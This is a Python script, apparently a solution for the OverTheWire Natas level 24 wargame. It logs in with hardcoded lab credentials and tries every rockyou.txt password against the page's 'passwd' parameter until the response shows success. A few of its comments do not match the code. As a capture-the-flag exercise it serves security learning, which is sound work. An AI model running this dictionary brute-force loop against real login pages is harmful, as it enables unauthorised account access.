import os
import urllib.request as url
import urllib.parse
import string
import time

# Note: This script uses rockyou.txt. It might need to be downloaded for the script to run

NATAS_URL = 'http://natas24.natas.labs.overthewire.org/index.php'
NATAS_USERNAME = 'natas24'
NATAS_PWD = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
PASSWORD_LENGTH = 33


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password(
        'Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    # This commented out tactic also works. The website accepts the Authorization header
    # after having connected at least once

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


def isCorrectInput(string):
    '''
    Determines if the string is the correct id or not

        Parameters:
            string : The id

        Returns:
            True if the id is correct. False otherwise
    '''
    my_url = NATAS_URL + f'?passwd={string}'
    output = url.urlopen(my_url)

    html_page = output.read().decode()

    return True if html_page.find('credentials') != -1 else False


if __name__ == "__main__":

    initialPageConnexion()

    # =======================================================================================
    # This part creates a list of letters that are in the password. I commented it out
    # because it takes some time to run so I want to avoid running it too often
    # =======================================================================================

    with open('natas24/rockyou.txt', 'rb') as f:
        wordlist = f.readlines()
        for word in wordlist:
            word = word.decode().strip()
            print(word)
            if (isCorrectInput(word)):
                print(f"Password is {word}")
                break
